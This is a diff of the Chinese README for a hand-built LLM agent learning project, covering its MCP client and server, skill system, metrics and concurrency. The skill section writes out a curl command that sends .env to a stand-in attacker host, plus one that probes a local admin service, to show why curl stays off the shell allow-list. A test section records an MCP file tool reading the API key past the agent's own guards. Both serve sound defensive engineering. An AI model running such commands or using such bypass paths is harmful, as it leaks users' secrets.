@@ -1,8 +1,20 @@
 # mini-agent
 
-从零手写的 Agent 内核 —— 4 周学习项目的代码仓库。
+从零手写的 Agent 内核 —— 5 周学习项目的代码仓库。
 
-完整计划见上层目录的 [`../ROADMAP.md`](../ROADMAP.md)。
+没有 LangChain、没有框架封装：`messages` 列表、`while` 循环、工具协议、
+MCP client / server、skill 全部手写。**每处设计决策都写了「为什么」和实测数字。**
+
+| 周 | 主题 | 最重要的结论 |
+|---|---|---|
+| 1 | 让模型开口 | 模型的记忆**就是** `messages` 列表，没有别的 |
+| 2 | 让模型动手 | 工具说明书是每轮固定开销；安全必须 fail-closed，不能靠模型自觉 |
+| 3 | 记得住、活得下去 | 真值 vs 视图；session 是流水账，memory 是结论 |
+| 4 | 从脚本变成项目 | 先装仪表盘再改系统；`async` 救不了同步函数 |
+| 5 | MCP 与 skill | 协议适配在边缘；安全边界不够用时**新开窄路，不是放宽旧路** |
+
+> 学习路线图不在本仓库内 —— 这里只放代码和结论。
+> 想快速判断它有没有用，直接看下面「它现在能做什么」的三个实跑结果。
 
 ## 目录说明
 
@@ -11,30 +23,54 @@ mini-agent/
 ├── pyproject.toml      # 项目定义与依赖清单（uv 读它）
 ├── .python-version     # 锁定 Python 版本
 ├── uv.lock             # 依赖锁定，保证换机器环境一致
-├── .gitignore          # 含 .env 与 .venv/，防止 Key 泄露
+├── .gitignore          # 含 .env / .venv/ / data/ / MEMORY.md
 ├── .env.example        # 配置模板（进 Git）
 ├── .env                # 你的真实 Key（不进 Git，需自己从模板复制）
 ├── stage0_check.py     # 【阶段 0 交付物】调通一次模型接口
 ├── agent/
 │   ├── __init__.py
 │   ├── llm.py          # 模型调用封装 —— 唯一与厂商耦合的文件
-│   ├── loop.py         # 核心循环 —— 记忆在这里
+│   ├── loop.py         # 核心循环 —— 记忆、工具轮次、技能注入都在这里
 │   ├── session.py      # 【第 3 周】会话持久化（JSONL）
-│   ├── context.py      # 【第 3 周】上下文裁剪
+│   ├── context.py      # 【第 3 周】上下文裁剪（token 预算驱动）
 │   ├── memory.py       # 【第 3 周】长期记忆（跨会话，防被裁剪）
 │   ├── config.py       # 【第 3 周】配置化（把「凭据」与「配置」分开）
+│   ├── metrics.py      # 【第 4 周】三段耗时 + token + 错误
+│   ├── skills.py       # 【第 5 周】skill 两层渐进披露
+│   ├── mcp/            # 【第 4 周扩展】手写的 MCP client
+│   │   ├── protocol.py #   子进程 + 一行一条 JSON + 队列超时
+│   │   ├── client.py   #   握手 / tools/list / tools/call
+│   │   ├── tool.py     #   远端工具伪装成本地 Tool
+│   │   └── host.py     #   进程级连接池 + 单 server 失败降级
 │   └── tools/          # 【第 2 周】工具层
 │       ├── __init__.py
-│       ├── base.py       # 工具基类 + Schema 生成
+│       ├── base.py       # 工具基类 + Schema 生成 + concurrency_safe
 │       ├── registry.py   # 注册表 + 自动发现
 │       ├── get_time.py   # 工具 1：读系统时间（无副作用）
 │       ├── read_file.py  # 工具 2：读项目内文件（必须做路径校验）
-│       └── run_shell.py  # 工具 3：执行只读命令（必须做白名单）
+│       ├── run_shell.py  # 工具 3：执行只读命令（必须做白名单）
+│       ├── fetch_url.py  # 【第 5 周】只读 GET + SSRF 防护（替代 curl）
+│       └── load_skill.py # 【第 5 周】按需读 skill 全文
+├── skills/             # 【第 5 周】skill 说明书，一个目录一个技能
+│   ├── aihot/
+│   │   ├── SKILL.md
+│   │   └── references/  #   第二层：细节留在 references，用到才读
+│   └── news-summary/
+│       └── SKILL.md
+├── mcp_servers/        # 【第 5 周】自己写的 MCP server（独立进程）
+│   ├── protocol.py     #   JSON-RPC over stdio
+│   ├── docs_tools.py   #   4 个检索工具
+│   ├── build_index.py  #   建 SQLite FTS5 索引
+│   └── data/docs.db    #   索引产物（635 个小节）
+├── server.py           # 【第 4 周】FastAPI 接口层
+├── web/index.html      # 【第 4 周】原生 JS 聊天页（不引 Node 构建链）
 ├── cli.py              # 命令行入口
-├── config.json         # 【第 3 周】模型配置档案（进 Git —— 它不是秘密）
-├── data/sessions/      # 【第 3 周】会话记录（JSONL，已在 .gitignore 中）
-├── MEMORY.md           # 【第 3 周】长期记忆（你自己也能编辑，已在 .gitignore 中）
-├── .venv/              # 虚拟环境（uv 自动创建，不进 Git）
+├── config.json         # 模型档案 + mcpServers（进 Git —— 它不是秘密）
+├── tests/              # 83 条单测
+├── docs/review-nanobot.md  # 【第 4 周】对照 nanobot 的复盘
+├── data/sessions/      # 会话记录（JSONL，已在 .gitignore 中）
+├── MEMORY.md           # 长期记忆（你自己也能编辑，已在 .gitignore 中）
+└── .venv/              # 虚拟环境（uv 自动创建，不进 Git）
 ```
 
 ## 快速开始（换台机器照这个走）
@@ -59,6 +95,72 @@ uv run mini-agent-server
 > 命令是从 `[project.scripts]` 来的，等价于 `uv run python server.py`。
 > 好处是换机器不用记「哪个文件是入口」。
 
+**换机器会踩的两个坑（都在 `config.json` 里）：**
+
+1. `base_url` 必须和你的 Key 是**同一家厂商**。不匹配会报 401「令牌已过期」——
+   看着像 Key 过期，其实是拼错了厂商。详见下文「⚠️ 真实踩坑」。
+2. `mcpServers.command` 写的是本机 **Windows 绝对路径**。macOS / Linux 上要改成
+   `.venv/bin/python`，否则 MCP 连不上 —— 不会崩，只是少了那 4 个工具（单个 server 失败会降级）。
+
+## 它现在能做什么（三个真实跑通的例子）
+
+不是功能列表，是三次实际运行的结果。你 clone 下来应该能复现出同类的回答。
+
+### 1. 查一份本机索引（hello-agents 教程，635 个小节）
+
+```bash
+uv run mini-agent --tools
+> Hello-Agents 第九章 ContextBuilder 的 GSSC 流水线怎么实现的？
+```
+
+真实调用序列（7 次工具调用，10.8s）：
+
+```
+1. mcp_helloagents_search_docs({"query": "ContextBuilder"})
+2. mcp_helloagents_search_docs({"query": "GSSC 流水线"})
+3. mcp_helloagents_get_section({"section_id": 585})
+4. mcp_helloagents_get_outline({"chapter": "9"})
+5. mcp_helloagents_get_section({"section_id": 587})
+6. mcp_helloagents_get_section({"section_id": 589})
+7. mcp_helloagents_get_section({"section_id": 588})
+```
+
+注意它自己换了一次检索词再搜，然后取一小节试探，觉得不够才拉整章大纲、一次取三节。
+**没人教它这个顺序** —— 工具描述里只写了「先 search 找候选，再用 get_section 取全文」。
+
+> ⚠️ **一个反直觉的实测（2026-10-21）**：同一个问题**关掉工具**去问，模型把 GSSC 四个字母也答对了
+> —— 这本书是公开的，早在训练数据里。
+>
+> 但**细节是编的**：它说 Select 阶段「按相关性、时效性、重要性筛选」，
+> 而原文是按「相关性×权重 + 新近性×权重」打分、过滤掉 `min_relevance` 以下的项、再贪心填充到 token 预算。
+>
+> **所以判断「要不要接检索」的判据不是「数据是否私有」，而是「模型会不会编」。**
+> 想干净地测「工具到底有没有用」，得用「今天发生了什么」这种**模型不可能见过**的问题（见下一个例子）。
+
+### 2. 看今天的事（实时数据，模型不可能知道）
+
+```bash
+uv run mini-agent --tools
+> 今天 AI 领域有什么值得关注的进展？要具体消息，带来源。
+```
+
+| | 关工具 | 开工具 |
+|---|---|---|
+| 回答 | 「我的知识截止于 2026 年 2 月，无法提供…」 | 8 条，带来源、分钟级时间戳、原文链接 |
+| 耗时 | 3.5s | 15.5s |
+
+模型会自己判断该读哪个技能：先 `load_skill("aihot")` 拿说明书，再 `fetch_url` 抓接口，
+最后按说明书规定的格式出中文简报。**没有人告诉它这个顺序，是说明书写的。**
+
+### 3. 本地三件小事
+
+```bash
+uv run mini-agent --tools
+> 现在几点？把 pyproject.toml 读出来，告诉我项目叫什么。
+```
+
+它会连续调 `get_time` + `read_file`，两步完成。这两个工具都被安全边界约束着（见「四层安全边界」）。
+
 ## 常用命令
 
 在本目录下执行（PyCharm 用 `Alt + F12` 打开内置 Terminal，它会自动停在本目录）：
@@ -67,7 +169,7 @@ uv run mini-agent-server
 uv add <包名>                    # 装依赖 —— .venv 在这一刻自动出现
 uv add --dev <包名>              # 只装开发期用的（如 pytest），不进运行时依赖
 uv sync                          # 按 uv.lock 把环境恢复成一致状态
-uv run pytest                    # 跑全部单测
+uv run pytest                    # 跑全部单测（83 条）
 
 uv run mini-agent-server         # 第 4 周：起 Web 界面（窗口要一直开着）
 uv run mini-agent "你好"          # 单轮提问
@@ -83,7 +185,18 @@ uv run mini-agent --no-memory                   # 【第 3 周】关掉长期记
 
 uv run mini-agent --profiles                    # 【第 3 周】列出配置档案
 uv run mini-agent --profile smart "你好"         # 【第 3 周】换一套配置跑
+
+uv run python -m mcp_servers                    # 【第 5 周】起自己的 MCP server（调试用）
+uv run python -m mcp_servers.build_index        # 【第 5 周】重建文档索引（数据变了才要跑）
 ```
+
+> **`-m mcp_servers` 不需要你一直开着。** 它是给 Cursor / Claude Desktop 这类客户端用的工具库，
+> 客户端会自己 spawn 一个。你手动跑的那个实例只用于调试，两者互不相干。
+> 想看它能不能用，一条命令就够（不用写客户端）：
+>
+> ```bash
+> echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' | uv run python -m mcp_servers
+> ```
 
 > `uv run python cli.py ...` 和 `uv run mini-agent ...` 完全等价，前者也仍然可用。
 > 打包之后推荐用后者 —— 它不依赖「你在哪个目录」。
@@ -256,6 +369,17 @@ nanobot 用 **Dream** 定时任务补上这一步（额外一次模型调用去�
 
 注册表（`registry.py`）会自动扫描这个目录并收走它，**别处一行都不用改**。
 
+### 到了第 5 周，扩展方式有三种，别选错
+
+| 想做的事 | 用哪种 | 为什么 |
+|---|---|---|
+| 加一个能力（读文件、发请求、查数据库） | **本地工具** `agent/tools/*.py` | 进程内，零开销 |
+| 加一套「怎么做这类活」的流程 | **skill** `skills/<名>/SKILL.md` | 纯文字，改完即生效，不用重启代码 |
+| 想让**别的软件**也能用这个能力 | **MCP server** `mcp_servers/` | 独立进程，跨客户端 |
+
+判断口诀：**能力用工具，经验用 skill，给别人用 MCP。**
+最常犯的错是把「流程」写成工具 —— 那样模型每加一个流程你都要改一次代码。
+
 ## 第 2 周的代价：工具说明书是固定开销
 
 `tools` 字段**每一轮请求都要重发一遍**。实测 1 个工具会让 `prompt_tokens` 从 17 涨到 276。
@@ -407,6 +531,260 @@ httpx.get(base + "/models", headers={"Authorization": "Bearer " + key}).json()["
 
 这不是偷懒，是刻意的。接口是契约 —— 能不动就不动，改动成本会沿着调用链扩散。
 
+## 第 4 周：接口层、指标、并发、测试
+
+### 顺序上的一个教训：先装仪表盘，再改系统
+
+原计划是「接口层 → 可观测性 → 并发 → 测试」。实际做到一半发现：**接口层做完，Web 端还是调不了工具。**
+
+因为 `run()` / `stream()` 是一问一答，只有 `run_with_tools()` 才带工具循环。
+文件名看着齐全，能力其实断链 —— **能力要按调用链逐个核对，不能按文件名想当然。**
+
+而工具一旦接上 Web，立刻多出「一次请求内部调了几次模型、时间花在网络还是本地」这些问题。
+答不出来就无法判断改动是好是坏。所以顺序改成：**先装仪表盘，再改系统。**
+
+### 指标为什么必须分段
+
+`agent/metrics.py` 记三段：`prepare` / `model` / `tool`。
+
+本地工具是毫秒级，网络等待是秒级，**差三个数量级，混在一起平均等于没测**。
+
+聚合时有两条纪律，都是踩出来的：
+
+| 问题 | 做法 | 为什么 |
+|---|---|---|
+| 失败轮要不要计入平均耗时 | **一律排除** | 500 错误只要 0.3s，会把 60s 超时的真实情况掩盖掉 |
+| 排除失败轮后分母怎么算 | **也只数成功轮** | 分子排除、分母不排除，平均值会凭空变小 |
+
+另外：空列表返回 `{"turns": 0, "empty": true}`，不返回空 dict —— 让前端能区分「没数据」和「取不到」。
+
+实测收益：慢请求跑了 17.3s 期间，另一个客户端请求 `/api/info` 只用了 **24.4ms**，说明线程池没被堵死。
+
+### 并发：`async` 救不了同步函数
+
+这是最容易想错的一点：
+
+```
+工具是同步阻塞函数（读文件、跑命令）
+塞进 async def 里，没有 await 点 → 事件循环照样被卡住
+→ 必须用线程池
+```
+
+实现就三行：
+
+```python
+jobs = [partial(self.tools.call, tc.name, tc.parsed_arguments()) for tc in tool_calls]
+with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
+    return list(pool.map(lambda job: job(), jobs))
+```
+
+`pool.map` **保序** —— 这一点比快慢重要得多：
+
+> **慢是可见的，顺序错是不可见的。**
+> 结果顺序错了，模型会把 A 的结果当成 B 的，然后基于错误前提继续推理，答得很怪但不报错。
+
+三条设计约束：
+
+1. `Tool.concurrency_safe` 默认 **False**（fail-closed）。代价不对称：猜错「安全」→ 结果随机；猜错「不安全」→ 只是慢。
+2. **整批要么全并行、要么全串行**，不挑安全的并行 —— 那会改变工具的意图顺序。
+3. `max_workers` 直接用条数。比它小会排队，比它大是白占内存。
+
+实测：两只真实读工具 0.70s → 0.50s（1.4×）。测试用两个各睡 0.4s 的假工具，阈值卡 0.7s。
+
+### 连接池：948.7ms → 1.2ms
+
+`httpx.Client()` 每次新建要 **948.7ms**（大头是 SSLContext 初始化），复用后一次请求 **1.2ms**。
+
+所以 `llm.py` 改成进程级共享 + 懒加载。三个细节：
+
+- `timeout` 仍然每次传（它跟请求走，不跟连接走）
+- `keepalive_expiry` 属于 `httpx.Limits`，不属 `Timeout`
+- 流式必须用 `client.stream()`；`client.post(stream=True)` 会把整个响应读完再返回
+
+### 流式 + 工具：`tool_calls.arguments` 是碎片
+
+即使开了 `stream=True`，参数也不是一次给全，而是按 `index` 分桶逐片下发：
+
+```
+帧1 index=0 id='call_x' name='get_time' args=''
+帧2 index=0 id=None     name=None       args='{}'
+帧3 index=1 id='call_y' name='read_file' args=''
+帧4 index=1 id=None     name=None       args='{'
+帧5 index=1 id=None     name=None       args='"path": "config.json"}'
+```
+
+三条只能照数据写、不能照直觉写的规则：
+
+1. **`id` / `name` 只在首片出现** → 后续是 None，覆盖会把它们冲掉（`tool_call_id` 是回填对号的唯一凭据）
+2. **`arguments` 逐片拼接** → 用 `=` 覆盖会只剩最后一片
+3. **多个 index 交错下发** → 必须 dict 按 index 分桶，不能用 list 往后追加
+
+还有一条反直觉的：**该轮 `content` 可能非空**（实测 11 个字符，模型先说「我来帮你查一下」再调工具）。
+所以「content 为空」既不能当「要调工具」的判据，也不能当「失败」的判据 —— 唯一可靠判据是 `tool_calls` 本身。
+
+## 第 5 周 · MCP client：内核不知道 MCP 存在
+
+`agent/mcp/` 四个文件，`loop.py` 只多了一个 `mcp_servers` 参数。
+
+```python
+RemoteTool(远端工具)  →  伪装成本地 Tool  →  registry 里和 get_time 平级
+```
+
+**这是整个设计里最值得学的一点：协议适配发生在边缘，不在内核。** 内核只管「有哪些工具、叫什么、参数是什么」。
+
+### 三个传输层的坑（都会表现成「莫名不动」）
+
+| # | 坑 | 后果 | 解法 |
+|---|---|---|---|
+| 1 | `readline()` 没有超时 | server 卡住 → 整个 Agent 停住 | 读线程 + `queue.get(timeout)` |
+| 2 | `stderr=PIPE` 没人读 | 缓冲区写满后**子进程在 write 上永久阻塞** | 单独起线程读干 stderr |
+| 3 | Windows 的 `npx` 实为 `npx.CMD` | `Popen` 直接 spawn 失败 | `cmd /d /c` 包裹 |
+
+第 2 条最阴：它不报错，只是进程不往下走了。
+
+### 工具说明书的代价
+
+| | prompt_tokens |
+|---|---|
+| 空对话 | 17 |
+| 接入 filesystem server（8 个工具） | **1565** |
+
+而且**每一轮都要重发**。所以 `config.json` 里的 `enabledTools` 白名单不是可选项 —— 接一个 29 工具的 server 会让每轮固定开销涨到几千 token。
+
+### ⚠️ 安全实测：四层防线只约束「自己写的工具」
+
+同一个 `mini-agent/.env`：
+
+| 路径 | 结果 |
+|---|---|
+| 本地 `read_file(".env")` | **拒绝**（第二层拦截） |
+| MCP filesystem server 的 `read_text_file` | **读到了 436 字符，含 `LLM_API_KEY`** |
+
+原因是四层防线写在 `agent/tools/` 里，而 MCP 工具是**另一条路径**。
+
+结论有三条：
+1. **「能不能出项目」和「项目里什么敏感」是两个独立问题** —— 前者正确不蕴含后者。
+2. **任何外部工具都是新增的绕过路径。** 接 MCP 等于扩大攻击面，不是「白得一堆能力」。
+3. **范围就是权限。** filesystem server 的根目录绝不能给项目根 —— 那会连 `data/sessions`、`.env` 一起交出去。
+
+## 第 5 周 · 自己的 MCP server：635 个小节的文档检索
+
+`mcp_servers/` 是**独立进程**，不 import `agent/` 任何东西。这才叫作品 —— 任何支持 MCP 的客户端都能直接用。
+
+### 为什么用 FTS5，不用向量库
+
+文档检索第一反应是上 embedding。这里没上，原因是**启动成本**：
+
+| | SQLite FTS5 | 向量库（Chroma / FAISS） |
+|---|---|---|
+| 冷启动 | 毫秒级 | 要加载 embedding 模型，十几秒到几分钟 |
+| 依赖 | Python 自带 | 额外几百 MB |
+| 中文检索 | `trigram` 分词可用 | 更强（语义近似） |
+
+关键约束在 MCP 这一侧：**server 是 stdio 子进程，握手前必须就绪。**
+实测连一个 `npx` 的 filesystem server，首次握手已经要 19.3s。再叠几分钟模型加载 → **必然握手超时。**
+
+所以分工是：**低频、可接受慢启动的场景用向量检索；要被随时 spawn 的 MCP server 用 FTS5。**
+
+### 4 个工具，两级检索
+
+| 工具 | 用途 |
+|---|---|
+| `list_chapters` | 先看有哪 16 章，确定往哪找 |
+| `search_docs` | **主入口**：按技术词检索小节，回编号 + 上下文 |
+| `get_outline` | 拿到某一章的小节标题列表 |
+| `get_section` | 按编号取一小节全文 |
+
+**为什么要两级**（先 search 拿编号，再 get_section 取全文）：
+一次把整章塞进上下文是几万 token，而且大部分用不上。
+两级检索的代价是多一次工具调用，收益是上下文只装真正要看的那一小节。
+
+工具描述里还写了「查询用具体技术词，不要用整句问句」——
+这是在**教模型怎么用工具**，属于工具设计的一部分，不是废话。
+
+### 给 Cursor / Claude Desktop 配
+
+`config.json` 里的 `mcpServers` 是**同一个格式**，可以直接抄：
+
+```json
+{
+  "mcpServers": {
+    "helloagents": {
+      "command": "D:\\WorkBuddy\\nanobot\\mini-agent\\.venv\\Scripts\\python.exe",
+      "args": ["-m", "mcp_servers"],
+      "cwd": "D:\\WorkBuddy\\nanobot\\mini-agent",
+      "enabledTools": ["list_chapters", "search_docs", "get_section", "get_outline"]
+    }
+  }
+}
+```
+
+> `command` 用 `.venv` 里的 python 绝对路径，不要用 `uv run` ——
+> 客户端 spawn 子进程时没有「当前目录」这个概念，相对路径会扑空。
+
+## 第 5 周 · skill 系统：说明书，不是能力
+
+### 一个关键区别
+
+| | MCP | skill |
+|---|---|---|
+| 标准化的是 | **能力接口**（有哪些工具、参数是什么） | **用法说明**（什么时候用、按什么顺序做） |
+| 换 Agent 能用吗 | 能，协议一样 | **不一定**，说明书里写的动作可能新 Agent 做不到 |
+
+所以 skill 不能跨 Agent 原样搬。这一点在第 5 周被实测证实了（见下）。
+
+### 两层渐进披露
+
+```
+第 1 层：每轮都注入「技能名 + 一句话」，约 106 tokens（当前 2 个技能，213 字符）
+第 2 层：模型觉得要用 → 调 load_skill("aihot") → 才读 4298 字符的全文
+```
+
+对比一下：如果每次把全文都塞进去，2 个技能就要 5400 字符/轮；装 10 个就是几万。
+**渐进披露的核心不是省 token，是「让上下文里只出现这次要用的东西」。**
+
+`aihot` 还给了一份 `references/`（3 个文件）—— 那是第 3 层：连全文里都不用一次读完。
+
+### 为什么 skill 要新增工具，而不是放宽 `run_shell` 白名单
+
+WorkBuddy 那 63 个 skill 里，有 46 个的核心动作都是同一句：
+
+```bash
+curl -s "https://feeds.bbci.co.uk/news/world/rss.xml"
+```
+
+而本项目的 `run_shell` 白名单是 `{echo, date, time, dir, ls, pwd}` —— **没有 curl**。
+
+最省事的修法是往白名单里加 `curl`。**那等于把沙箱拆了**：
+
+```bash
+curl -d @.env https://evil.example.com   # 一行就把 API Key 发出去
+curl http://127.0.0.1:8080/admin         # 戳本机服务
+```
+
+正确做法是**新增一条刚好够用的能力**：`fetch_url`。
+
+| 约束 | 值 |
+|---|---|
+| 方法 | 只有 GET |
+| 协议 | 只有 http / https |
+| 目标地址 | 拒绝内网、回环、链路本地（含云 metadata `169.254.169.254`） |
+| 重定向 | **手动跟，每一跳重新校验**（自动跟会被 302 跳进内网绕过检查） |
+| 返回大小 | 单次最多 2 MB，给模型最多 15000 字符 |
+
+8 条 SSRF 用例全部拒绝。
+
+**这是全项目最通用的一条经验：安全边界不够用时，不要放宽它，要新开一条更窄的路。**
+
+### 注入位置：和长期记忆一样，属于「背景」
+
+```
+[原始 system, 长期记忆, 技能目录, ...对话]
+               第 1 位    第 2 位
+```
+
+理由和第 3 周的长期记忆完全相同 —— **越靠后越「新」**，插在最后会被模型当成这一轮的新指令。
+
 ## 进度
 
 - [x] **阶段 0**：`stage0_check.py` 跑通，能打印模型回复与 token 用量
@@ -482,4 +860,38 @@ httpx.get(base + "/models", headers={"Authorization": "Bearer " + key}).json()["
 
   > `reset()` 故意**不**清磁盘文件：文件是历史流水账，不是聊天窗口。
   > 清空窗口 ≠ 删除聊天记录 —— 所以 `/reset` 后接着写，旧记录仍在。
-- [ ] 第 4 周：HTTP 接口 + 测试 + 打包
+- [x] **第 4 周**：从脚本变成项目（v0.8 → v0.11.0）
+  - [x] `server.py` —— FastAPI（会话池 + 线程池 + SSE）
+  - [x] `web/index.html` —— 原生 JS 聊天页，不引 Node 构建链
+  - [x] `agent/metrics.py` —— 三段耗时 / token / 错误，JSONL 落盘
+  - [x] `/api/metrics` 聚合 + `/api/metrics/raw` 明细
+  - [x] 工具调用接入 Web 分两步：先非流式跑通（`452efa7`），再补分片归并（`0c2e400`）
+  - [x] 工具并发（`ThreadPoolExecutor` + `pool.map` 保序）
+  - [x] 连接池复用 `httpx.Client`：948.7ms → 1.2ms
+  - [x] 83 条测试全绿；用变异测试验证过断言不空转（把切片改坏，保序测试立刻红）
+  - [x] 打包 v0.11.0：`uv build` 产物含两个 `console_scripts`
+  - [x] 复盘 nanobot 的 `loop.py` / `runner.py` → `docs/review-nanobot.md`
+- [x] **第 4 周扩展 · MCP client**（`ff724c6`，1085 行）
+  - [x] `agent/mcp/`：`protocol.py` / `client.py` / `tool.py` / `host.py`
+  - [x] 响应按 `id` 配对 —— 假 server 故意在响应前插一条通知来锁死这个行为
+  - [x] 三个传输层坑：`readline` 无超时 / `stderr` 无人读会卡死子进程 / Windows `.cmd` 包裹
+  - [x] `loop.py` 只多一个 `mcp_servers` 参数 —— 内核不知道 MCP 存在
+  - [x] 真实 filesystem server 端到端：14 个工具，模型自主调 2 个，6.8s
+  - [x] **安全实测：MCP 绕过了本地敏感文件的四层边界**（见上文）
+- [x] **第 5 周 · 自己的 MCP server**（`314f9ca`）
+  - [x] `mcp_servers/` 独立进程，不 import `agent/`
+  - [x] 635 个小节 / SQLite FTS5 trigram / 4 个工具两级检索
+  - [x] 端到端：模型自主调 4 次工具，6.9s，答案精确到小节号
+- [x] **第 5 周 · skill 系统 + `fetch_url`**（`602821c`）
+  - [x] `agent/skills.py` —— 两层渐进披露（目录 106 tokens，全文按需读）
+  - [x] `agent/tools/fetch_url.py` —— 只读 GET + SSRF 防护，替代 `curl`
+  - [x] `agent/tools/load_skill.py` —— 按需读说明书全文
+  - [x] `skills/aihot` + `skills/news-summary` 两个技能
+  - [x] 端到端：模型自主 `load_skill` → `fetch_url` → 按格式出中文简报，15.5s / 8 条
+- [x] **`pytest` 全绿：83 passed**
+- [ ] **已知局限（诚实清单）**
+  - [ ] wheel 里**不含** `web/index.html` —— 只影响 `pip install` 分发，`uv run` 不受影响
+  - [ ] HTTP 层**零鉴权** —— 只能在本机用，不能直接暴露到公网
+  - [ ] `_agents` 会话池没有 TTL，长期跑会一直占内存
+  - [ ] 撞上 `max_iterations` 时，工具结果在 `messages` 里但用户拿不到 —— 正确做法是再发一次不带 `tools` 的请求收尾
+  - [ ] 界面缺 Markdown 渲染 / 代码高亮 / 停止按钮（简报里的列表现在是 `- ` 原始符号）
